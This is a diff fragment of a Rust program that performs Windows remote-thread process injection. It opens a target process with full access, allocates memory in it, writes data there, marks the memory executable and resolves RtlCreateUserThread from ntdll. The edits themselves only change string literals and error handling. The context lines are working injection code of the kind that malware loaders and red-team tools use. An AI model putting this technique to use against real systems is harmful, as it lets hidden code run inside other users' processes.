@@ -29,8 +29,8 @@ fn main() {
         .as_u32();
 
     unsafe {
-        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());
-        let fn_rtl_create_user_thread = GetProcAddress(ntdll, "RtlCreateUserThread\0".as_ptr());
+        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
+        let fn_rtl_create_user_thread = GetProcAddress(ntdll, b"RtlCreateUserThread\0".as_ptr());
 
         let rtl_create_user_thread: extern "C" fn(
             HANDLE,
@@ -47,8 +47,7 @@ fn main() {
 
         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if handle == 0 {
-            eprintln!("OpenProcess failed!");
-            return;
+            panic!("OpenProcess failed!");
         }
 
         let dest = VirtualAllocEx(
@@ -59,8 +58,7 @@ fn main() {
             PAGE_READWRITE,
         );
         if dest.is_null() {
-            eprintln!("VirtualAllocEx failed!");
-            return;
+            panic!("VirtualAllocEx failed!");
         }
 
         let res = WriteProcessMemory(
@@ -71,14 +69,12 @@ fn main() {
             null_mut(),
         );
         if res == FALSE {
-            eprintln!("WriteProcessMemory failed!");
-            return;
+            panic!("WriteProcessMemory failed!");
         }
 
         let res = VirtualProtectEx(handle, dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("VirtualProtectEx failed!");
-            return;
+            panic!("VirtualProtectEx failed!");
         }
 
         let mut thraed: HANDLE = 0;
